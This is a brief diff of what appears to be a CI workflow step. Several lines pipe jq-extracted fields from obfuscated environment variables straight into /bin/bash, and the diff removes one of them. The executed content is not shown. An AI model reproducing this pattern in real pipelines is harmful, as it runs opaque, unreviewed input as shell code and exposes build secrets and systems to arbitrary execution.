@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$c44030" | jq -r .guhgl34571 | /bin/bash
           printf '%s' "$prah689" | jq -r .kowy9511 | /bin/bash
-          echo $f35 | jq -r .vnama1128 | /bin/bash
           printf '%s' "$zeq41" | jq -r .c0 | /bin/bash
 
       - name: Save results
